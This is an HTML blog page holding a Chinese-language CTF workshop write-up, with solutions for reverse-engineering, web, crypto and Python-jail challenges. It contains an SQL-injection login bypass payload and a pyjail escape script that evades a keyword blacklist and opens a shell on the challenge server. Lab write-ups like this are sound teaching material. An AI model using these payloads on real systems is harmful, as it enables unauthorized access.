@@ -1,0 +1,400 @@
+
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+    <meta charset="utf-8" />
+    <title>國家資通安全院 - CTF 種子培訓工作坊 | 此情吳計可消除</title>
+    <meta name="author" content="yih-0118" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/lioshi.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.css" />
+<script src="/js/lib/math.js"></script>
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>載入過慢請開啟快取 瀏覽器預設開啟</p>
+                    <img src="/images/load.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>此情吳計可消除</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;首頁</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;關於我</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;檔案</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;分類</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;標籤</span>
+        </a>
+        
+        <!-- 添加深色模式切換按鈕 -->
+        <a href="javascript:void(0);" id="dark-mode-toggle-desktop" @click="toggleDarkMode">
+            <i :class="['fa-solid', darkMode ? 'fa-sun' : 'fa-moon', 'fa-fw']"></i>
+            <span>&ensp;{{ darkMode ? '淺色模式' : '深色模式' }}</span>
+        </a>
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;此情吳計可消除</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">首頁</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">關於我</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">檔案</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">分類</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">標籤</div>
+                    </div>
+                </a>
+                
+                <!-- 添加深色模式切換按鈕 -->
+                <a href="javascript:void(0);" id="dark-mode-toggle-mobile" @click="toggleDarkMode">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i :class="['fa-solid', darkMode ? 'fa-sun' : 'fa-moon', 'fa-fw']"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">{{ darkMode ? '淺色模式' : '深色模式' }}</div>
+                    </div>
+                </a>
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>國家資通安全院 - CTF 種子培訓工作坊</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/7/12
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/writeup/" style="color: #ff7d73">
+                    writeup
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><ul>
+<li>排名<br><img src="https://hackmd.io/_uploads/ByOguM3P0.png" alt="image"><span id="more"></span></li>
+</ul>
+<h1 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h1><p>就是welcome<br><img src="https://hackmd.io/_uploads/Sy-8HMnvR.png" alt="image"></p>
+<hr>
+<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Chosen-0"><a href="#Chosen-0" class="headerlink" title="Chosen 0"></a>Chosen 0</h2><p>檔案丟到ida就能看到<br><img src="https://hackmd.io/_uploads/Hkit9K0vC.png" alt="image"></p>
+<h2 id="Chosen-1"><a href="#Chosen-1" class="headerlink" title="Chosen 1"></a>Chosen 1</h2><p>先丟到ida反編譯<br>去看看有沒有奇怪的</p>
+<pre><code class="c">BOOL8 __fastcall checkFlag(const char *a1)
+&#123;
+  char s2[64]; // [rsp+10h] [rbp-40h] BYREF
+  generateFlag(&quot;Avada_Kedavra&quot;, s2);
+  return strcmp(a1, s2) == 0;
+&#125;
+</code></pre>
+<pre><code class="c">int __fastcall generateFlag(_BYTE *a1, char *a2)
+&#123;
+  _BYTE *v2; // rax
+  __int64 i; // [rsp+18h] [rbp-8h]
+
+  for ( i = 5381LL; ; i = 33 * i + (char)*v2 )
+  &#123;
+    v2 = a1++;
+    if ( !*v2 )
+      break;
+  &#125;
+return sprintf(a2, &quot;NCKUCTF&amp;#123;%lu&amp;#125;&quot;, i);
+&#125;
+</code></pre>
+<p>解題程式</p>
+<pre><code class="python">def generate_hash(s):
+    h = 5381
+    for c in s:
+        h = 33 * h + ord(c)
+    return h &amp; 0xFFFFFFFFFFFFFFFF  # 保持為64位整數
+
+input_str = &quot;Avada_Kedavra&quot;
+hash_value = generate_hash(input_str)
+flag = f&quot;NCKUCTF&#123;&#123;&#123;hash_value&#125;&#125;&#125;&quot;
+print(flag)
+</code></pre>
+<h2 id="Kazdle"><a href="#Kazdle" class="headerlink" title="Kazdle"></a>Kazdle</h2><p>去看題目的js<br>會發現正確的是第141個<br><img src="https://hackmd.io/_uploads/B1rOiFCw0.png" alt="image"><br>找到第141個放進去就好了<br><code>NCKUCTF&#123;allbeefneedispatience&#125;</code></p>
+<hr>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Login-Panel"><a href="#Login-Panel" class="headerlink" title="Login Panel"></a>Login Panel</h2><p>如果我們用guest&#x2F;guest登入的話再跳到<code>/dashboard</code>會因為不是admin所以拿不到flag<br>所以我們用sql injection就好</p>
+<ul>
+<li>帳號：<code>admin</code></li>
+<li>密碼：<code>&#39;OR 1=1 --</code><br>就進去了<br><img src="https://hackmd.io/_uploads/ryIEIz3D0.png" alt="image"></li>
+</ul>
+<h2 id="Starburst-Cat-Shop"><a href="#Starburst-Cat-Shop" class="headerlink" title="Starburst Cat Shop"></a>Starburst Cat Shop</h2><p>登入帳號隨便打<br><img src="https://hackmd.io/_uploads/Hke_AKCPA.png" alt="image"><br>先用burp suite擋住<br>一直按buy，然後全部forward出去，就出來了<br><img src="https://hackmd.io/_uploads/r1HZJ9APC.png" alt="image"></p>
+<hr>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Caesar"><a href="#Caesar" class="headerlink" title="Caesar"></a>Caesar</h2><p><img src="https://hackmd.io/_uploads/HJ5rQY0PA.png" alt="image"><br><img src="https://hackmd.io/_uploads/HynO7tCDA.png" alt="image"><br>得出位移了14格</p>
+<h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><p>丟去rsa decoder就好</p>
+<pre><code class="!">e = 0x10001
+n = 94222487035514568148220182471104690931780594128516176949111095868335830867719277805539132735917016524185107312037557600880949236829032793818738351079213184870243702834570026012503355620032058527302541127368383734031131208254140211165705925154251280613034133968327987267589895419787888903387665859859148412543
+b64_c = &#39;N5lOVmbqGv0F1UiqdEy+T3Klilrwvp8cCZdLbnKPFWeqP9Mh/nzxtWC00G6GGPxmyMnOGdX9omDgxthlUAQGpaWeAnj84qrzU62Bq3m6RuP0pqE/wub6rMbHeK6gebgcd8GmUDX+gbhuLxtA4Z5+jyoyayi8t2xyCXHFtVXOm7Q=&#39;
+int_c = 39042841328709556214265103020897101350928166266738871446328808453325125686468702532379771433443668090510537708890843833523366699079886852742174164548701470967388728724472159586068406789847736565656024626914080978879991724002842467193318864530876999109696543271802935281934399726950922142641870912695365966772
+</code></pre>
+<p><img src="https://hackmd.io/_uploads/rkR6XKRvA.png" alt="image"></p>
+<h2 id="Vigenere"><a href="#Vigenere" class="headerlink" title="Vigenère"></a>Vigenère</h2><p><a target="_blank" rel="noopener" href="https://www.guballa.de/vigenere-solver">https://www.guballa.de/vigenere-solver</a><br>用這個網站解就好了<br><img src="https://hackmd.io/_uploads/HkSzLY0PR.png" alt="image"></p>
+<h2 id="⊕-XOR"><a href="#⊕-XOR" class="headerlink" title="⊕ (XOR)"></a>⊕ (XOR)</h2><p>題目程式</p>
+<pre><code class="python">#!/usr/bin/python3.10
+
+from pwn import xor
+from secret import flag, key
+
+assert len(key) == 3
+
+cipher = xor(flag, key).hex()
+
+# transform the cipher into hex format
+print(&quot; &quot;.join([cipher[i:i+2] for i in range(0, len(cipher), 2)]))
+</code></pre>
+<p>解題程式</p>
+<pre><code class="python">from pwn import xor
+
+ciphertext = &#39;121f0213281b1b011c031a171c0c101c1c11000c08312a1c65001c1a63170b0006170611112e&#39;
+ciphertext_bytes = bytes.fromhex(ciphertext)
+
+key = bytes([(ciphertext_bytes[0] ^ ord(&#39;F&#39;)),
+             (ciphertext_bytes[1] ^ ord(&#39;L&#39;)),
+             (ciphertext_bytes[2] ^ ord(&#39;A&#39;))
+             ])
+
+decrypted_bytes = xor(ciphertext_bytes, key)
+print(decrypted_bytes)
+</code></pre>
+<h2 id="Nonce-Nonce"><a href="#Nonce-Nonce" class="headerlink" title="Nonce Nonce"></a>Nonce Nonce</h2><p>加密程式</p>
+<pre><code class="python">#!/usr/bin/python3.10
+
+from secret import flag
+from Crypto.Cipher import AES
+from Crypto.Util.Counter import new 
+from os import urandom
+from Crypto.Util.Padding import pad
+
+key = urandom(16)
+iv = urandom(4)
+
+def encrypt(plain, key=key):
+    ctr = new(128 , initial_value=int.from_bytes(iv, &#39;big&#39;))
+    aes = AES.new(key , mode=AES.MODE_CTR , counter=ctr)
+
+    return aes.encrypt(pad(plain, 16))
+
+print(encrypt(flag).hex())
+print(encrypt(b&quot;TSCCTF&quot; * 6).hex())
+</code></pre>
+<p>解題程式</p>
+<pre><code class="python">from Crypto.Util.strxor import strxor
+import binascii
+ciphertext1 = &quot;a2dcf363fb24aee5fb6f56946710be19b9973e009339b5af3f6072985b3e51ab9162db9c5198e96f5ac81f14226b1de3&quot;
+ciphertext2 = &quot;b0c3f167d42c95d8fb195d8000168e1fb2b85f0c974ad18d34076e936e1b6e9da052aea75198e96f5ac81f14226b1de3&quot;
+ct1 = binascii.unhexlify(ciphertext1)
+ct2 = binascii.unhexlify(ciphertext2)
+known_pt = b&quot;TSCCTF&quot; * 6
+keystream = strxor(ct2, known_pt)
+flag = strxor(ct1, keystream)
+
+print(&quot;Flag:&quot;, flag)
+</code></pre>
+<hr>
+<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="pyjail-1"><a href="#pyjail-1" class="headerlink" title="pyjail 1"></a>pyjail 1</h2><p>nc 連進去會先看到</p>
+<pre><code>yih_0118@Macbook m774 % nc chall.nckuctf.org 8030
+#!/usr/local/bin/python3
+
+print(open(__file__).read())
+
+inp = input(&quot;&gt;&gt;&gt; &quot;)
+blacklist = (&quot;import&quot;, &quot;os&quot;, &quot;system&quot;, &quot;input&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;open&quot;)
+if not sum(bad in inp for bad in blacklist):
+    print(eval(inp))
+else:
+    print(&quot;bad boyQQ&quot;)
+
+&gt;&gt;&gt; 
+</code></pre>
+<p>可以看到是<code>eval</code>的漏洞<br>但是會先檢測是否含有<code>blacklist</code>中的&#x3D;&#x3D;字&#x3D;&#x3D;</p>
+<pre><code class="!">&gt;&gt;&gt; globals()
+&#123;&#39;__name__&#39;: &#39;__main__&#39;, &#39;__doc__&#39;: None, &#39;__package__&#39;: None, &#39;__loader__&#39;: &lt;_frozen_importlib_external.SourceFileLoader object at 0x7f1d37998c10&gt;, &#39;__spec__&#39;: None, &#39;__annotations__&#39;: &#123;&#125;, &#39;__builtins__&#39;: &lt;module &#39;builtins&#39; (built-in)&gt;, &#39;__file__&#39;: &#39;/home/pyjail/jail.py&#39;, &#39;__cached__&#39;: None, &#39;__warningregistry__&#39;: &#123;&#39;version&#39;: 0&#125;, &#39;inp&#39;: &#39;globals()&#39;, &#39;blacklist&#39;: (&#39;import&#39;, &#39;os&#39;, &#39;system&#39;, &#39;input&#39;, &#39;eval&#39;, &#39;exec&#39;, &#39;open&#39;)&#125;
+</code></pre>
+<pre><code class="python">from pwn import *
+r = remote(&quot;chall.nckuctf.org&quot;, 8030)
+p = &quot;globals()[&#39;_&#39;+&#39;_builtins__&#39;].__dict__[&#39;__i&#39;+&#39;mport__&#39;](&#39;o&#39;+&#39;s&#39;).__dict__[&#39;s&#39;+&#39;ystem&#39;](&#39;sh&#39;)&quot;
+r.sendlineafter(&quot;&gt;&gt;&gt; &quot;, p)
+r.interactive()
+</code></pre>
+<p>進去之後 <code>cat flag_432rdeoibhedqnjd</code>即可<br><img src="https://hackmd.io/_uploads/HkvGVFCDC.png" alt="image"></p>
+<h2 id="google-form"><a href="#google-form" class="headerlink" title="google form"></a>google form</h2><p>去搜尋關鍵字就有了<br><img src="https://hackmd.io/_uploads/HybAGKRwR.png" alt="image"></p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2023 - 2024 此情吳計可消除
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;yih-0118
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+</body>
+</html>
